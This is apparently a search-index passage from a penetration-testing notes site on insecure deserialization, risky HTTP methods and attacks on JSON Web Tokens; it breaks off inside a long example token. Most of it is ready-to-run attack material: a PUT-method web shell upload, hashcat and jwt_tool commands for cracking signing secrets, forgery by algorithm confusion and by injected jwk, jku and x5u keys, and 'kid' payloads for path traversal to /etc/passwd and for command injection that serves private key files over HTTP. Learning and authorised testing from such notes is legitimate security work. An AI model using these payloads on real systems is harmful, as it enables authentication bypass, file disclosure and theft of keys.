process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/insecure-deserialization/#what-is-insecure-deserialization","title":"What is Insecure deserialization?","text":"<p>Insecure deserialization vulnerability occurs when untrusted or unknown data is used to either inflict a denial of service attack, execute code, bypass authentication, or further abuse the logic behind an application. </p>"},{"location":"Pentesting/Web%20Application/insecure-deserialization/#tools","title":"Tools","text":"<p>ysoserial: https://github.com/frohoff/ysoserial</p>"},{"location":"Pentesting/Web%20Application/insecure-deserialization/#references","title":"References","text":"<ul> <li> <p>https://youtu.be/5grJYo9IqY0</p> </li> <li> <p>https://hackerone.com/reports/562335</p> </li> <li> <p>https://portswigger.net/web-security/deserialization</p> </li> <li> <p>https://thehackerish.com/insecure-deserialization-explained-with-examples</p> </li> <li> <p>https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/insecure-http-methods/","title":"Insecure HTTP Methods","text":""},{"location":"Pentesting/Web%20Application/insecure-http-methods/#insecure-http-methods","title":"Insecure HTTP Methods","text":""},{"location":"Pentesting/Web%20Application/insecure-http-methods/#one-liner","title":"One Liner","text":"<ul> <li>Checking HTTP Methods</li> </ul> <pre><code>curl -i -X OPTIONS http://XXXXnmap --script http-methods --script-args http-methods.url-path='/test' $ipCurl usagecurl -X POST http://internal-01.bart.htb/simple_chat/register.php -d \"uname=0xdf&amp;passwd=password\"\n</code></pre> <ul> <li>Shell via Put Method</li> </ul> <pre><code>Put Shellcurl -X PUT -T \"/path/to/file\" \"http://myputserver.com/puturl.tmp\"curl -X MOVE --header \u00a0\"Destination:http://ip/asp.asp\" \"http://ip/asp.txt\"\n</code></pre>"},{"location":"Pentesting/Web%20Application/insecure-http-methods/#http-status-codes","title":"HTTP Status Codes","text":"Sr.No.Method and Description1<p>GET</p><p>It retrieves information from a server using a given URI. It is essential that GET requests only retrieve data and do not alter it in any way.</p>2<p>HEAD</p><p>Similar to GET, but only transfers the status line and header.</p>3<p>POST</p><p>Data is sent to the server using this method. For example, collecting user information, file uploading etc.</p>4<p>PUT</p><p>By using the PUT method, you're telling the server to store the enclosed entity under the given URI. If the URI refers to an existing resource, it gets modified, and if it doesn't, then the server creates the resource with that URI.</p>5<p>DELETE</p><p>It removes the resource from target source supplied by given URI.</p>6<p>CONNECT</p><p>It establishes a tunnel to the server identified by a given URI.</p>7<p>OPTIONS</p><p>It shows all available methods to communicate with the server.</p>8<p>TRACE</p><p>A HTTP TRACE method is used for diagnostic purposes. It will echo the exact request that was received in its response if the TRACE method is enabled.</p>"},{"location":"Pentesting/Web%20Application/insecure-http-methods/#how-to-exploit","title":"How to Exploit","text":"<p>To exploit any methods it is important to know which methods are enabled, for that we can simply check via OPTIONS</p> <p></p> <p>If that not worked you should definitely try by submitting random word as method. Sometime you might receive and error which shows which methods are implemented. </p> <p></p> <p>Once we got to know which methods are enabled then we will look for exploit respectively.</p> <ul> <li> <p>HEAD, GET, POST, and CONNEC are safe HTTP Method. Of course, the request itself may have malicious parameters, but that is separate from the exploiting http Method topic. It is always recommended that disable unnecessary methods. </p> </li> <li> <p>PUT, DELETE - these methods were initially intended as file management operations. Some web servers still support these in their original format. You can change or delete files from the server's file system arbitrarily. If these are enabled, it opens you to perform some dangerous attacks. Here is the great article to exploit PUT method - https://www.arridae.com/blogs/HTTP-PUT-method.php</p> </li> <li> <p>OPTIONS: As previously mentioned, we can use this method to identify which other methods are enabled so it can be considered a shortcut to finding another hole. Now, this is not a vulnerability; since there is no actual use for it, it just increases the attack surface and should ideally be disabled. Although the OPTIONS method is used for several legitimate purposes nowadays, for example, some REST APIs require an OPTIONS request, CORS requires pre-flight requests, and so on. So there are scenarios wherein OPTIONS should be enabled, but the default should still be \"disabled unless required\".</p> </li> <li> <p>TRACE - This is also a diagnostic method that returns the entire HTTP Request in the response body. This includes the request body and the request headers, including, e.g. cookies, authorization headers, and more. Not too surprising, this can be substantially misused, such as the classic Cross-Site Tracing (XST) attack, wherein an XSS vector can be utilized to retrieve HttpOnly cookies, authorization headers, and such. This should be disabled.</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/","title":"JWT and it's bypass","text":""},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jwt-and-its-bypass","title":"JWT and it's bypass","text":""},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jwt-handbook","title":"JWT Handbook","text":"<ul> <li>JWT Handbook</li> </ul>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#background","title":"Background","text":"<p>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.\\ Although JWTs can be encrypted to also provide secrecy between parties, we will focus on signed tokens. Signed tokens can verify the integrity of the claims contained within it, while encrypted tokens hide those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#structure","title":"Structure","text":"<p>In its compact form, JSON Web Tokens consist of three parts separated by dots (<code>.</code>), which are:</p> <ul> <li>Header</li> <li>Payload</li> <li>Signature</li> </ul> <p>Therefore, a JWT typically looks like the following.</p> <p><code>asd.xyz.qwe</code></p> <p>Let's break down the different parts.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#header","title":"Header","text":"<p>The header typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA.</p> <p>For example:</p> <pre><code>{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n</code></pre> <p>Then, this JSON is Base64Url encoded to form the first part of the JWT.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#payload","title":"Payload","text":"<p>The second part of the token is the payload, which contains the claims. Claims are statements about an entity (typically, the user) and additional data.</p> <pre><code>{\n  \"sub\": \"1337\",\n  \"name\": \"unstable\",\n  \"admin\": false\n}\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#signature","title":"Signature","text":"<p>To create the signature part you have to take the encoded header, the encoded payload, a secret, the algorithm specified in the header, and sign that.</p> <p>For example, if you want to use the HMAC SHA256 algorithm, the signature will be created in the following way:</p> <pre><code>HMACSHA256(\n  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  secret)\n</code></pre> <p>The signature is used to verify the message wasn't changed along the way, and, in the case of tokens signed with a private key, it can also verify that the sender of the JWT is who it says it is.\\ The signature is then base64 encoded.</p> <p>To familiarise yourself with JWT you can use the decoder at https://jwt.io/</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jwt-signing-algorithms","title":"JWT Signing Algorithms","text":"<p>The most common algorithms for signing JWTs are:</p> <ul> <li>HMAC + SHA256 (HS256)</li> <li>RSASSA-PKCS1-v1_5 + SHA256 (RS256)</li> <li>ECDSA + P-256 + SHA256 ( ES256)</li> </ul>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#vulnerabilities","title":"Vulnerabilities","text":""},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#signature-validation","title":"Signature validation","text":"<p>The first easiest thing you can check is whether you can tamper with the payload by keeping the signature as it is.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#cracking-the-hmac-secret","title":"Cracking the HMAC secret","text":"<p>As secure as <code>HS256</code> is, especially when implemented the right way, brute-forcing a JSON web token signed with small and medium-sized shared secrets using HS256 is still very possible.\\ If you are able to crack/find the HMAC secret you can do anything with the token. This could be a critical vulnerability.\\ There are two ways to perform this attack</p> <ol> <li>Dictionary attack</li> <li>Bruteforce attack</li> </ol>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#dictionary-attack","title":"Dictionary attack","text":"<pre><code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt\njohn jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256\n\n#https://github.com/ticarpi/jwt_tool\npython3 jwt_tool.py -d rockyou.txt &lt;JWT token&gt;\n\n#https://github.com/Sjord/jwtcrack\npython crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt\n\n#https://github.com/mazen160/jwt-pwn\npython3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w rockyou.txt\n\nDictionary attack with a common default password list\nDictionary attack with a \u2018leaked passwords\u2019 wordlist\nTargeted Dictionary attack with words scraped from the target website (and related wiki pages?)\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#bruteforce-attack","title":"Bruteforce attack","text":"<pre><code>hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n\n#https://github.com/brendan-rius/c-jwt-cracker\n./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8\n\n#https://github.com/lmammino/jwt-cracker\njwt-cracker \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\" \"abcdefghijklmnopqrstuwxyz\" 6\n\nBrute force attack using a narrow focus (e.g. ?u?l?l?l?l?l?l?l?l --incremental)\nLong-running Brute force attack using a broad focus (e.g. ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a -i --increment-min=6)\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#none-matters","title":"None matters","text":"<p>There was a CVE assigned (CVE-2015-9235) for this attack. developers tend to use \"none\" algorithm for testing purpose and sometimes keeps as it is! To automate this type of attack we strongly recommend using Burpsuite's extension \"JSON Web Tokens\". This extension comes with four different types of \"none\" keywords you can try!\\ To do this process manually, head to jwt.io and remove a signature from the JWT token then change \"algorithm to none\".</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#expiration","title":"Expiration","text":"<p>Sometimes it is worth checking whether the JWT token expires or not. You can make a request with the JWT token after log out to the endpoint. Sometimes the JWT token never expires. We have mentioned the ways to steal the JWT token below on this page. Be sure to retest this same token in ~24 hours and report it if it never expires.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#rsa-key-confusion","title":"RSA Key Confusion","text":"<p>The JWT spec also defines a number of asymmetric signing algorithms (based on RSA and ECDSA). With these algorithms, tokens are created and signed using a private key but verified using a corresponding public key. This is pretty neat: if you publish the public key but keep the private key to yourself, only you can sign tokens, but anyone can check if a given token is correctly signed.</p> <p>Unfortunately, an attacker can abuse this. If a server is expecting a token signed with RSA, but actually receives a token signed with HMAC, it will think the public key is actually an HMAC secret key.</p> <p>If you change the algorithm from RS256 to HS256, the back-end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature. Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:</p> <pre><code>openssl s_client -connect example.com:443 2&gt;&amp;1 &lt; /dev/null | sed -n '/-----BEGIN/,/-----END/p' &gt; certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the \"non\" algorithm attack also). \n</code></pre> <p>You can also use jwt_tool to perform this attack.</p> <pre><code>python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#kid-issues","title":"Kid issues","text":""},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#sql-injection","title":"SQL injection","text":"<p> When you decode the JWT, you will see a parameter called KID, or different JWT Claims which retrieves a key file from the file system. You can try to exploit them if they aren\u2019t properly sanitized.</p> <pre><code>{\n\u201calg\u201d : \u201cHS256\u201d,\n\u201ctyp\u201d : \u201cJWT\u201d,\n\u201ckid\u201d : \u201c1\u201d // KID is often used to retrieve a key file from the file system\n}\n</code></pre> <p>Instead of value 1, we can modify it and add our SQLi payload. The final JWT will look something like this:</p> <pre><code>{\n\u201calg\u201d : \u201cHS256\u201d,\n\u201ctyp\u201d : \u201cJWT\u201d,\n\u201ckid\u201d : \u201cSELECT * FROM users WHERE username = 'admin'--' AND password = ''\u201d\n}\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#lfi","title":"LFI","text":"<p>If the claim \"kid\" is used in the header, check if you can use a different file in the file system. Pick a file you might be able to predict the content of. This vulnerability has the same process as the SQLi one, but we use different payload:</p> <pre><code>../../../../etc/passwd\n</code></pre> <p>If KID parameter isn\u2019t properly sanitized, it becomes vulnerable to LFI. We simply add our payload and the final JWT will look something like this,</p> <pre><code>{\n\u201calg\u201d : \u201cHS256\u201d,\n\u201ctyp\u201d : \u201cJWT\u201d,\n\u201ckid\u201d : \u201c../../../etc/passwd\u201d\n}\n</code></pre> <p>You can also use jwt_tool to perform this attack and keep the original signature,</p> <pre><code>python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv \"../../etc/passwd\" -S hs256 -p \"\"\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#command-injection","title":"Command Injection","text":"<p>The process is the same as SQLi with KID and Local File Inclusion. When the \"kid\" parameter contains a path to the file with the key and this path is being used inside an executed command you could be able to obtain RCE and expose the private key with a payload like the following:</p> <pre><code>/root/res/keys/secret7.key; cd /root/res/keys/ &amp;&amp; python -m SimpleHTTPServer 1337&amp;\n</code></pre> <pre><code>{\n\u201calg\u201d : \u201cHS256\u201d,\n\u201ctyp\u201d : \u201cJWT\u201d,\n\u201ckid\u201d : \u201c1\u201d | whoami;\n}\n</code></pre>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#cve-20180114","title":"CVE-2018\u20130114","text":"<p>This CVE specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.</p> <p>If the server is vulnerable to the mentioned vulnerability, then a token that contains attacker generated public key and is signed using the corresponding private key generated by the attacker would get accepted by the server.</p> <p>Example JWT token</p> <pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiIzMjQtMjMyMzQzMjQtNTQ0NTM1LTEzMjAyMTQiLCJ1c2UiOiJzaWciLCJuIjoiMDBkNDM3ODY4MTY4MGYxMTkwMzIxNjBlMDFjZTgyMWU2Y2YzZWJmNjc2ZDIxODhmZDRkYmU1ZDQ4MzdhYTYxMmYwMDYzZTYwMmRlOGI3N2I4N2JlMGMzOTlkYzEwZDczM2FlNzlhNzAyYmE3ZDAzOTE3ZDYwMzJkNGQzNWY3ZWEzNDdjMGE3YTAxNDQxNTEzOThkYjEwZWYzNjhiZGUzMjE0ZTIyNWRlNjA2YmIyZWQ2M2Q5ZmQzNDA0YjgwM2I1YTIwNTUwYjlkOWY2Y2QzNWM0ODkwN2ExZmI5ZjJkYjhmNzkzNTY5MmE2YTk5NzUyZGNjYTZlOWI3OTdiZDg2MWMxNmVhODIwYTNmZDYxZGRjY2FmNWI4OGY3NDBjZTNkNjFiNTc3ZTVhMWQ1ZGQ2NmYwNjQ5NWNmY2Q2NzAzYTA0OWMyMzM4MTMwOWVhMjYyMjllNGE5YzZmNjgyOTcxNDM5OWQwYTM3ODc2NTlkOWQ1ZDM3MGI5NWFlMmQ2NjgxMzYxMGRmMGJmMWM4YjVkNzFhNjc3YTYzMjI2MDIzYTM4OGU0OTFlOGZhOTk2ZGRlNWVhYjY2MGQ3ZGZkYjk5NTMyYmYwMDczYWRlMzE2ODdhYjhlYmJkNWI0MGNjNzQ2MDViN2NkMzU2NzFhNDc5YjUyNjQ0MTg2OGY2NzYyYmM0ZiIsImUiOiIxMDAwMSJ9fQ.eyJpZCI6MiwiaWF0IjoxNTczNTgwOTg2LCJleHAiOjE1NzM2NjczODZ9.xgB2zsknOBbghHwKZZZG9Xi0NJGzaeDj7uxg_Y_QfQwKU2oPHS-XhwfIR3yVuN1fimSfV-tSeEHsaKlTDRY-YBpY8EhHTSLz3-i6iKeUwE0JarMKZOo5hBsm_OKSwPhhr4ilkXRUAXeyOJNHNxcDtGcLsgYWg1MUNI8YXadJz0uh8yc3coAs5lqNfVBG_HjHk4hXAzjzp4s0siZD94GsSkbVqwp0gLlgX-gEeMxJSMCKDrBXrbFJpJOTcKYAuRCe6uHVFvzutpFvwKJ2EXOFZsnWqvegcAaCvN5QCBV2O__cSRkhnT5i7XHJoXeEoApmfvZjqFG91Ve15jA-GGR9Ng\n</code></pre> <ol> <li>Generate public and private key pairs.</li> </ol> <pre><code>openssl genrsa -out keypair.pem 2048\nopenssl rsa -in keypair.pem -pubout -out publickey.crt\nopenssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key\n</code></pre> <p>    2. Now create a forged token. if you decode the above JWT token you can see two keys \"n\" and \"e\". which can be generated using a public key. To retreive, these values use the following js code.</p> <pre><code>const NodeRSA = require('node-rsa');\nconst fs = require('fs');\n\nkeyPair = fs.readFileSync(\"keypair.pem\");\n\nconst key = new NodeRSA(keyPair);\nconst publicComponents = key.exportKey('components-public');\n\nconsole.log('Parameter n: ', publicComponents.n.toString(\"hex\"));\nconsole.log('Parameter e: ', publicComponents.e.toString(16));\n</code></pre> <p>run the above script using node,</p> <p>    3. Now since you have \"n\" and \"e\" which you can replace in the above jwt token using jwt.io. and sign the token using the private key supplied by the attacker and would be verified by the server using the embedded public key, which also belongs to the attacker.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jku-and-x5u","title":"jku and x5u","text":""},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jku","title":"jku","text":"<p>jku stands for JWK Set URL.\\ If the token uses a \u201cjku\u201d Header claim then check out the provided URL. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token.</p> <ol> <li>The key used for token verification is extracted from the certificate located at the URI present in the \u201cjku\u201d header parameter.</li> <li>If the attacker generates a public-private key pair and creates a forged token using the generated private key and replace the \u201cjku\u201d parameter\u2019s value with the URI of this newly generated JWK Set JSON file (hosted on an HTTP server), then essentially the forged token would get accepted by the server.</li> </ol> <p>The attack steps are quite similar to what mentioned above. Once you created a public and private key pair then generate \"n\" and \"e\" using the public key. Now create a jwks.json file and update the \"n\" and \"e\" values. Now host the \"jwks.json\" file locally and update the same in jwt token.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#x5u","title":"x5u","text":"<p>The \u201cx5u\u201d (X.509 URL) Header Parameter is a URI that refers to a resource for the X.509 public key certificate or certificate chain corresponding to the key used to digitally sign the JWS (JSON Web Signature). The first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous one, thus completing the certificate chain.</p> <ol> <li>The key used for token verification is extracted from the certificate located at the URI present in the \u201cx5u\u201d header parameter.</li> <li>If the attacker generates a self-signed certificate and creates a forged token using the corresponding private key and replaces the \u201cx5u\u201d parameter\u2019s value with the URI of this newly generated certificate (hosted on an HTTP server), then essentially the forged token would get accepted by the server.</li> </ol> <p>Create a self-signed certificate,</p> <pre><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt\n</code></pre> <p>Now extract the public key from the generated certificate.</p> <pre><code>openssl x509 -pubkey -noout -in attacker.crt &gt; publicKey.pem\n</code></pre> <p>Now follow the same steps we followed in the earlier attack. Host the attacker.crt locally and change the header value accordingly.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#x5c","title":"x5c","text":"<p>The \u201cx5c\u201d (X.509 certificate chain) Header Parameter contains the X.509 public key certificate or certificate chain corresponding to the key used to digitally sign the JWS (JSON Web Signature).</p> <p>Example token</p> <pre><code>eyJ4NXQiOiJPRVU1TjBVd1FUZENORFUzUWpBME5VUXhSakJDTjBOQ016UTBOVUZGTWtVeU4wTXpOalZDUWciLCJ1c2UiOiJzaWciLCJlIjoiTVRBd01ERSIsImt0eSI6IlJTQSIsImFsZyI6IlJTMjU2IiwibiI6Ik1EQmtOR014WkRrNE56ZGxObVppTVRjMU5qVTROemRrTW1FeE5qVTVZV0k0TXpCa056WTFNR1ZqWmpnM01UbGxaR0ZoTWpjelpUSTVNVFEzWlRkbVpHTXlZVGRtTjJZNU1qSmlZVGsyWlRVMVpqazNZbVZpTUdVMFpqUTFZV1psTUdZMU1qWmhZVEUwWlRBNU5XUmlOMlJpTlRFeU5qSmhZbVl5TVRoaFl6azNPVEEwWlRNNVltSTRaR0ZrWm1FNE1XTTJNVFJtWTJOaFpHUTBOMlUxWm1VME1HSTFZakl5TmpWbU9UYzVaR1k0TjJVeFlUTmlOamN5TTJKa01tRXlOREF6TW1VNVptUmlOMll3WmpBNFptWTFNelk1TlRrMVpUSmxaRGhrTVdSak5tRTRNbVk1T0RFMk1ERm1ZekV3Wm1NeE5tVXpNVGt4WVRsaE5tUXhNRGt5T1RGa09URTJabUl3T1dKbFptSXdZbVEyTmpoaVpUZzBOalU0TURRMk56VXhObVkzWkdOaU9EWmxPR0ZsTURZMlltWTNNekl4TmpOalltTXpaRFE1TkdZMk9XRmhaamM0WW1Fek1qYzJaREEzWmpObFl6ZGtNMlUwTTJObFpqSTBORFpqTWpZelpqZGxNVFUyTWpNNE9HUmpNREppT0RrMFl6RmxOVFJsTkRjNU5EUTVObVkxTnpRMFlqWmlPRGxrT0dFM1pqZ3dZV1ZtTkdFMlpHRTRNelUxWkRSa1l6WXpOMlkwTldObU0yTmhPRFZqTlRJelpEUmxNVGhoWW1JM05XWmxZbUpoT1dVM09ERTFOemRpTUdRMFpHVXlPV1l3WWpaalpEUXdaVGRtTURSbE5UQmhaakE0TkRNMlpEbGlNbUUxWldNeFlUQmtaV1F6WTJRMU1XVTJNamMyT0RFMlpUSm1OV1ZpTldZNU9ESTVOVEpqTXpBME5USmxNMk0yT0dZd1lqQTVZV1V6WldGbFlqTm1ZakUxWVRZM01XTTBObU01WkRWaE5HUTJZalJsWm1ZMU9ERmtabVE1T0dJeVptTTVOVE0xWlRWbVpUYzVPVGN3T0dKbE16QXhZbUZrTkROaE5UVTROVFpqTUdSa1lqZzFZemc0WXpJeU5qZGpaVFE0T1RoaFlqY3lPR1EyTmpobVpqTmtNbUptTWprd01UVTJPR0l4TXpNeE1EVXdNbVZsWWpFelpHUmxOemxtTkRsbVpUVXdZemN5TUdVek1XRmxZVE5sTWpRM1ptSTVPV1l5WTJGbFpUaGhZV0prT0RreU5tRmhZVGN3TW1aa1lqSTBOMkV6TjJZM05XTTVaR0ZtT1RNMU5ERTNPR016WVRObE5qaGtZMkptTVRZNE5qazFObU15TWpCbFpUTm1abUV6TkRVNU4yVTRPRFZoTWpkaE5ETmxOVGhqTnpObU5XTXdNR1EyWXpWaVpXUTFORFkyWWpVeFpESTNNVFkzTXpnMk4yWTVZMlZpWkRWa09HWm1abU5rWXpobE5USTNOREk1TW1aa1l6QmhPVE00WkRjd01EZ3pNamxsTVRsaE5HVmtZV0l5WkRnNE1qY3pZekkyWW1KbVpqazJPVEpoTnpOaVpqRTNaRGsyWWpZMk5qVTBOemxpTW1ZelpqY3hPV1ZqT0RCak5UVTVOamN3T0RZM09HSXhaREJrWVRZNFpETmlZamcwTWpFM1lUSTNNekkwWmpFNU0yWmxOVGsyTVRZeFpUY3pPREl5TVRBeFlURTROVGRoTVRjNU5UVTJPV1U1WkRZM01qRTJZVGd3WXpRek1tTXlNamcxWXpoayIsIng1YyI6Ik1JSUdDVENDQS9HZ0F3SUJBZ0lVUi9pWlpDRTNZSXU2TE02UW9HdWZ0cmIvL0Y0d0RRWUpLb1pJaHZjTkFRRUxCUUF3Z1pNeEN6QUpCZ05WQkFZVEFsVlRNUk13RVFZRFZRUUlEQXBEWVd4cFptOXlibWxoTVJJd0VBWURWUVFIREFsVGRXNXVlWFpoYkdVeEVqQVFCZ05WQkFvTUNWZHBkSEpoY0hCbGNqRVBNQTBHQTFVRUN3d0dWMmwwY21Gd01SSXdFQVlEVlFRRERBbDNhWFJ5Y0M1amIyMHhJakFnQmdrcWhraUc5dzBCQ1FFV0UyRmtiV2x1UUd4dlkyRnNhRzl6ZEM1amIyMHdIaGNOTVRreE1USXdNRFV4T1RNNFdoY05NakF4TVRFNU1EVXhPVE00V2pDQmt6RUxNQWtHQTFVRUJoTUNWVk14RXpBUkJnTlZCQWdNQ2tOaGJHbG1iM0p1YVdFeEVqQVFCZ05WQkFjTUNWTjFibTU1ZG1Gc1pURVNNQkFHQTFVRUNnd0pWMmwwY21Gd2NHVnlNUTh3RFFZRFZRUUxEQVpYYVhSeVlYQXhFakFRQmdOVkJBTU1DWGRwZEhKd0xtTnZiVEVpTUNBR0NTcUdTSWIzRFFFSkFSWVRZV1J0YVc1QWJHOWpZV3hvYjNOMExtTnZiVENDQWlJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dJUEFEQ0NBZ29DZ2dJQkFOVEIyWWQrYjdGMVpZZDlLaFpacTRNTmRsRHMrSEdlMnFKejRwRkg1LzNDcC9mNUlycVc1VitYdnJEazlGcitEMUpxb1U0SlhiZmJVU1lxdnlHS3lYa0U0NXU0MnQrb0hHRlB6SzNVZmwva0Mxc2laZmw1MzRmaG83WnlPOUtpUURMcC9iZnc4SS8xTnBXVjR1Mk5IY2FvTDVnV0Fmd1EvQmJqR1JxYWJSQ1NrZGtXK3dtKyt3dldhTDZFWllCR2RSYjMzTGh1aXVCbXYzTWhZOHZEMUpUMm1xOTR1akoyMEg4K3g5UGtQTzhrUnNKajkrRldJNGpjQXJpVXdlVk9SNVJKYjFkRXRyaWRpbitBcnZTbTJvTlYxTnhqZjBYUFBLaGNVajFPR0t1M1grdTZubmdWZDdEVTNpbnd0czFBNS9CT1VLOElRMjJiS2w3Qm9ON1R6VkhtSjJnVzR2WHJYNWdwVXNNRVV1UEdqd3NKcmo2dXMvc1ZwbkhFYkoxYVRXdE8vMWdkL1ppeS9KVTE1ZjU1bHdpK01CdXRRNlZZVnNEZHVGeUl3aVo4NUltS3R5aldhUDg5Sy9LUUZXaXhNeEJRTHVzVDNlZWZTZjVReHlEakd1bytKSCs1bnl5dTZLcTlpU2FxcHdMOXNrZWpmM1hKMnZrMVFYakRvK2FOeS9Gb2FWYkNJTzQvK2pSWmZvaGFKNlErV01jL1hBRFd4YjdWUm10UjBuRm5PR2Y1enIxZGovL055T1VuUXBMOXdLazQxd0NES2VHYVR0cXkySUp6d211LytXa3FjNzhYMld0bVpVZWJMejl4bnNnTVZaWndobml4ME5wbzA3dUVJWG9uTWs4WlArV1dGaDV6Z2lFQm9ZVjZGNVZXbnAxbklXcUF4RExDS0Z5TkFnTUJBQUdqVXpCUk1CMEdBMVVkRGdRV0JCUnJ4ZS9XWU81SWYyQnViYmwreVlYc0lTUXJMakFmQmdOVkhTTUVHREFXZ0JScnhlL1dZTzVJZjJCdWJibCt5WVhzSVNRckxqQVBCZ05WSFJNQkFmOEVCVEFEQVFIL01BMEdDU3FHU0liM0RRRUJDd1VBQTRJQ0FRQTEyOFhRZ05oQXgyUjg0STFEYVcvMldFVTNqSjZpQ3FNUXQ1YUNjMStXSkFQVUJXYlNaYzhSaFo2bUhCblRKN1NndXBjTVJtYVppZUlIcTZnN0VDU1FwR1p6Y3J0cEJsRGNnc1lKd0RpUm92aEltYXpZMGo4bm96ZHFBSkhMQmF0RFJyRFEzbHZGU29rV1F6eFNKOFpLenRIVzZWS3FiampaOFhTZm0zamJmOWMzVXlXcFVLVEgvV0RHeE15VGVIN0V6N1FvbDNPZjFqbkFtblltZi9XZS9tcmdSYjRGTVY4a3gvbWV5R3lIWmpSdmJlVHRDeWxmeHlmNDBCbkk0cVkwRytXVnBVZ0JDQlFBNUx2RGZIWUJRNVVhd0tlZCtRdmRrVERNWWJxaE9PaE1aS0tWS0ZML0k1dnBncEFUVk8zQWgvKzM3T1RMQ1A1THlYL1VzbXc2dCs2T2w2Z0s2SEJLUVNEczlaT3VPaW40THFhZ3Ria3pKVjY0U0FpbHpERHBZYXh0d2JuZnVIZVNSd205dVBwZW9MRGF6Q0N6V0dzL1lPYzBWdUxqaXZUcm5RU2JiSGE0S0lGeWtQb2JJbXJ4enVQR2orazVoelE0Z3ZBZjJESkJnQkRONjJ1WWVYMXZkWGg3TnVJM1I5RHg3bWFnb3paakhreHZoK0VMbXVUWlpXYkM2QjZiQWxEcU1qNmJJc241Q3RiSFdteXlMZTk2allxRmJaY1U4L0tMWW54RktOZjlIcEdTWnBvYTc1dnpPK0psTDJkYk9WNjNLR1pTYllyWHhoRkwweVgzWnhBYXBwemoxeVFTeVRPNCtWL1JhZE11cnk5ckMySHVzZkl4MXp2TDdKU0pWcFlUSG1MT2F